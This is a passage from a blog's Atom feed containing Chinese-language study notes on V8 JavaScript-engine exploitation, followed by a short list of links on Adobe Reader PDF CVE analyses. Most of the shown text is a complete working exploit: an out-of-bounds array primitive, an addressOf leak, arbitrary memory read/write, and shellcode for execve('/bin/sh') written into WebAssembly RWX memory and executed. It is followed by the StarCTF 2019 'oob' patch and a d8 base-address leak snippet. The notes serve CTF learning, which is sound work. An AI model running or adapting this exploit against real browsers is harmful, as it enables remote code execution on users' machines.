class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sunxiaokong</span></span><br><span class="line"><span class="comment">/*---------------------------datatype convert-------------------------*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//convert float to int</span></span><br><span class="line">    f2i(val) &#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    convert int to float</span></span><br><span class="line"><span class="comment">    if nead convert a 64bits int to float</span></span><br><span class="line"><span class="comment">    please use string like "deadbeefdeadbeef"</span></span><br><span class="line"><span class="comment">    (v8's SMI just use 56bits, lowest 8bits is zero as flag)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        <span class="keyword">let</span> vall = hex(val);</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = vall.slice(<span class="number">10</span>, );</span><br><span class="line">        tmp[<span class="number">1</span>] = vall.slice(<span class="number">2</span>, <span class="number">10</span>);</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">0</span>], <span class="number">16</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>(tmp[<span class="number">1</span>], <span class="number">16</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//convert number to hex string</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dt = <span class="keyword">new</span> typeConvert();</span><br><span class="line"><span class="comment">// console.log(hex(0x12345678deadbeef));</span></span><br><span class="line"><span class="comment">// console.log(hex(dt.overturn('deadbeef')));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*generate a Out-Of-Bound array and generate many ArrayBuffers and objects*/</span></span><br><span class="line"><span class="keyword">var</span> bufArray = [];</span><br><span class="line"><span class="keyword">var</span> objArray = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">8224</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objGen</span>(<span class="params">tag</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.leak = <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">this</span>.tag = tag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">x</span> =&gt;</span> (</span><br><span class="line">    &#123;</span><br><span class="line">        counter : <span class="number">0</span>,</span><br><span class="line">        next() &#123;</span><br><span class="line">        <span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line">        <span class="keyword">this</span>.counter++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">            oobArray.length = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// for(let i=0;i&lt;=1000;i++)&#123;</span></span><br><span class="line">            bufArray.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xbeef</span>));</span><br><span class="line">            objArray.push(<span class="keyword">new</span> objGen(<span class="number">0xdead</span>));</span><br><span class="line">            <span class="comment">// &#125;</span></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">) &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------search a ArrayBuffer which could be controlled by oobArray-------*/</span></span><br><span class="line"><span class="keyword">var</span> offsetBuf; <span class="comment">//target offset of oobArray</span></span><br><span class="line"><span class="keyword">var</span> indexBuf;  <span class="comment">//target offset in bufArray</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> x=<span class="number">0</span>; x&lt;=maxSize; x++) &#123;<span class="keyword">let</span> y = oobArray[x]&#125;; <span class="comment">//trigger the GC</span></span><br><span class="line"><span class="comment">//start search</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line">    <span class="keyword">let</span> val = dt.f2i(oobArray[i]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0xbeef00000000</span>===val)&#123;</span><br><span class="line">        offsetBuf = i<span class="number">-3</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[*] target buf offset of oobArray: "</span> + offsetBuf);</span><br><span class="line">        <span class="comment">// %DebugPrint(oobArray);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0xdead00000000</span>===val)&#123;</span><br><span class="line">        offsetObjLeak = i<span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"[*] target obj.leak offset of oobArray: "</span> + offsetObjLeak);</span><br><span class="line">        <span class="comment">// %DebugPrint(oobArray);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>].leak = target;</span><br><span class="line">    <span class="keyword">return</span> dt.f2i(oobArray[offsetObjLeak]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// test addressOf</span></span><br><span class="line"><span class="comment">// var testObj = &#123;a:'b'&#125;;</span></span><br><span class="line"><span class="comment">// %DebugPrint(testObj);</span></span><br><span class="line"><span class="comment">// console.log("leak test object : " + hex(addressOf(testObj)));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*---------------------arbitrary address read / write--------------------*/</span></span><br><span class="line"><span class="comment">// arbitrary address write</span></span><br><span class="line"><span class="keyword">var</span> dtView = <span class="keyword">new</span> <span class="built_in">DataView</span>(bufArray[<span class="number">0</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, value</span>)</span>&#123;</span><br><span class="line">    oobArray[offsetBuf+<span class="number">4</span>] = dt.i2f(addr);</span><br><span class="line">    dtView.setFloat64(<span class="number">0</span>, dt.i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// arbitrary address read</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr, str=false</span>)</span>&#123;</span><br><span class="line">    oobArray[offsetBuf+<span class="number">4</span>] = dt.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> tmp = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> tmp2 = [<span class="string">''</span>, <span class="string">''</span>];</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">''</span></span><br><span class="line">    tmp[<span class="number">1</span>] = hex(dtView.getUint32(<span class="number">0</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    tmp[<span class="number">0</span>] = hex(dtView.getUint32(<span class="number">4</span>)).slice(<span class="number">10</span>,);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">3</span>; i&gt;=<span class="number">0</span>; i--)&#123;</span><br><span class="line">        tmp2[<span class="number">0</span>] += tmp[<span class="number">0</span>].slice(i*<span class="number">2</span>, i*<span class="number">2</span>+<span class="number">2</span>);</span><br><span class="line">        tmp2[<span class="number">1</span>] += tmp[<span class="number">1</span>].slice(i*<span class="number">2</span>, i*<span class="number">2</span>+<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = tmp2[<span class="number">0</span>]+tmp2[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span>(str==<span class="literal">true</span>)&#123;<span class="keyword">return</span> <span class="string">'0x'</span>+result&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="built_in">parseInt</span>(result, <span class="number">16</span>)&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// // test AAR/AAW</span></span><br><span class="line"><span class="comment">// leakAddr = dt.f2i(oobArray[1])-1;</span></span><br><span class="line"><span class="comment">// console.log("[*] leak a test addr : " + hex(leakAddr));</span></span><br><span class="line"><span class="comment">// write64(leakAddr, '12345678deadbeef');</span></span><br><span class="line"><span class="comment">// console.log("[*] read in leakAddr : " + read64(leakAddr, true));</span></span><br><span class="line"><span class="comment">// write64(leakAddr, 0xdeadbeef);</span></span><br><span class="line"><span class="comment">// console.log("[*] read in leakAddr : " + hex(read64(leakAddr)));</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*-------------------------use wasm to execute shellcode------------------*/</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line"><span class="keyword">var</span> sharedInfo = read64(addressFasm+<span class="number">0x18</span><span class="number">-0x1</span>);</span><br><span class="line"><span class="keyword">var</span> codeAddr = read64(sharedInfo+<span class="number">0x8</span><span class="number">-0x1</span>);</span><br><span class="line"><span class="keyword">var</span> memoryRWX = (read64(codeAddr+<span class="number">0x70</span><span class="number">-0x1</span>)/<span class="number">0x10000</span>);</span><br><span class="line">memoryRWX = <span class="built_in">Math</span>.floor(memoryRWX);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] Get RWX memory : "</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line"><span class="comment">//sys_execve('/bin/sh')</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="string">'2fbb485299583b6a'</span>,</span><br><span class="line">    <span class="string">'5368732f6e69622f'</span>,</span><br><span class="line">    <span class="string">'050f5e5457525f54'</span></span><br><span class="line">];</span><br><span class="line"><span class="comment">//write shellcode into RWX memory</span></span><br><span class="line"><span class="keyword">var</span> offsetMem = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (x <span class="keyword">of</span> shellcode) &#123;</span><br><span class="line">    write64(memoryRWX + offsetMem, x);</span><br><span class="line">    offsetMem += <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//call funcAsm() and it would execute shellcode actually</span></span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure><h2 id="StarCTF-2019-CTF-oob"><a href="#StarCTF-2019-CTF-oob" class="headerlink" title="StarCTF 2019 (*CTF) oob"></a>StarCTF 2019 (*CTF) oob</h2><p><a href="https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/" target="_blank" rel="noopener">https://www.sunxiaokong.xyz/2020-01-13/lzx-starctf-oob/</a></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这个是出题给了一个array可以oob一个字节的洞，通过这个字节，我们可以修改对象的map属性，可以实现类型混淆/地址泄露。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT <span class="built_in">Object</span> GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len = args.length();</span><br><span class="line">+    <span class="comment">/* 参数多于2即退出 */</span></span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, <span class="attr">Object</span>::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);                       <span class="comment">//array即是this?</span></span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());         <span class="comment">//取数组对象的elements出来</span></span><br><span class="line">+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;<span class="built_in">Number</span>());            <span class="comment">//数组长度</span></span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));      <span class="comment">//读下标length的元素出来</span></span><br><span class="line">+                                                                                   <span class="comment">//即越界读一个元素大小</span></span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;<span class="built_in">Object</span>&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, <span class="attr">Object</span>::ToNumber(isolate, args.at&lt;<span class="built_in">Object</span>&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.set(length,value-&gt;<span class="built_in">Number</span>());                                      <span class="comment">//往下标length处写入value</span></span><br><span class="line">+                                                                                   <span class="comment">//即越界写一个元素大小</span></span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure><h3 id="传统利用"><a href="#传统利用" class="headerlink" title="传统利用"></a>传统利用</h3><p>传统利用就是泄露lib地址-&gt;hook某些函数-&gt;system/onegadget，在这里可以泄露d8加载地址。</p><p>一般是先选定一个地址，取低三位（即使开启地址随机化，低12位仍是恒定的偏移），只要从objaddr-0x8000开始循环读一个地址出来判断低12位，若符合我们选定地址的第三位，再读出地址里的内容，若目标地址内容为0x56415741e5894855，则可确定该地址即为d8装载空间中的地址，根据相对偏移即可确定d8装载基地址，再从got表中泄漏libc地址，即可完成内存泄漏。</p><p>但是这种看起来就不稳定，所以有以下方法，（妙，我好奇第一个发明出这种方法的人，是有多熟悉v8。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------------leak d8------------------------------*/</span></span><br><span class="line"><span class="keyword">var</span> code   = read64(addressOf(floatArray.constructor) - <span class="number">0x1</span>n + <span class="number">0x30</span>n); <span class="comment">//constructor.code ptr</span></span><br><span class="line"><span class="keyword">var</span> d8Leak = read64(code - <span class="number">0x1</span>n + <span class="number">0x40</span>n) &gt;&gt; <span class="number">16</span>n; <span class="comment">//read addr from "mov r10, addr"</span></span><br><span class="line"><span class="keyword">var</span> d8Base = d8Leak - <span class="number">0xad54e0</span>n;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] d8 base : "</span> + hex(d8Base));</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本就<code>数组越界 -&gt; 读写map指针 -&gt; 类型混淆 -&gt; 任意地址读写 -&gt; WASM执行Shellcode/劫持free_hook</code>。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>感觉v8学起来还是比较容易的，但是不知道洞是怎么挖出来的，fuzz浏览器？像lokihardt那样康一眼函数名？</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前一阵好不容易把v8环境搓好了，要学习一波v8、浏览器漏洞。&lt;/p&gt;
&lt;h2 id=&quot;入门知识&quot;&gt;&lt;a href=&quot;#入门知识&quot; class=&quot;headerlink&quot; title=&quot;入门知识&quot;&gt;&lt;/a&gt;入门知识&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://m
      
    
    </summary>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/v8/"/>
    
    
      <category term="二进制" scheme="https://github.com/Cracke-S-J/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="v8" scheme="https://github.com/Cracke-S-J/tags/v8/"/>
    
  </entry>
  
  <entry>
    <title>pdf相关漏洞分析</title>
    <link href="https://github.com/Cracke-S-J/2020/04/22/pdf%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/Cracke-S-J/2020/04/22/pdf%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-22T11:05:49.000Z</published>
    <updated>2020-04-22T14:59:50.777Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="Windows内存管理与js相关堆利用"><a href="#Windows内存管理与js相关堆利用" class="headerlink" title="Windows内存管理与js相关堆利用"></a>Windows内存管理与js相关堆利用</h3><p>我可能要先补一下windows内存管理及相关js知识，之前较少了解过。</p><p><a href="https://asanzjx.github.io/2018/11/27/FromHeapSprayToHeapFengShui/" target="_blank" rel="noopener">从 HeapSpray( 堆喷射 ) 到 HeapFengShui( 堆风水 )</a></p><h3 id="PDF相关"><a href="#PDF相关" class="headerlink" title="PDF相关"></a>PDF相关</h3><p><a href="https://www.anquanke.com/post/id/87127" target="_blank" rel="noopener">PDF文件解析与PDF恶代分析中的一些坑</a></p><h2 id="PDF漏洞（CVE-2018-12794）浅析"><a href="#PDF漏洞（CVE-2018-12794）浅析" class="headerlink" title="PDF漏洞（CVE-2018-12794）浅析"></a>PDF漏洞（CVE-2018-12794）浅析</h2><p><a href="https://www.anquanke.com/post/id/177861" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177861</a></p><h2 id="深入分析Adobe忽略了6年的PDF漏洞"><a href="#深入分析Adobe忽略了6年的PDF漏洞" class="headerlink" title="深入分析Adobe忽略了6年的PDF漏洞"></a>深入分析Adobe忽略了6年的PDF漏洞</h2><p><a href="https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/" target="_blank" rel="noopener">https://xlab.tencent.com/cn/2019/09/12/deep-analysis-of-cve-2019-8014/</a></p><h2 id="CVE-2018-4990-Adobe-Reader代码执行漏洞利用分析"><a href="#CVE-2018-4990-Adobe-Reader代码执行漏洞利用分析" class="headerlink" title="CVE-2018-4990 Adobe Reader代码执行漏洞利用分析"></a>CVE-2018-4990 Adobe Reader代码执行漏洞利用分析</h2><p><a href="https://www.anquanke.com/post/id/145822" target="_blank" rel="noopener">https://www.anquanke.com/post/id/145822</a></p><p><a href="https://www.freebuf.com/articles/system/173095.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/173095.html</a></p><h2 id="Fuzz闭源的PDF阅读器"><a href="#Fuzz闭源的PDF阅读器" class="headerlink" title="Fuzz闭源的PDF阅读器"></a>Fuzz闭源的PDF阅读器</h2><p><a href="https://www.anquanke.com/post/id/183330" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183330</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h2&gt;&lt;h3 id=&quot;Windows内存管理与js相关堆利用&quot;&gt;&lt;a href=&quot;#Windows内存管理与js相关堆利用&quot; class
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://github.com/Cracke-S-J/tags/CVE/"/>
    
  </entry>
  
</feed>
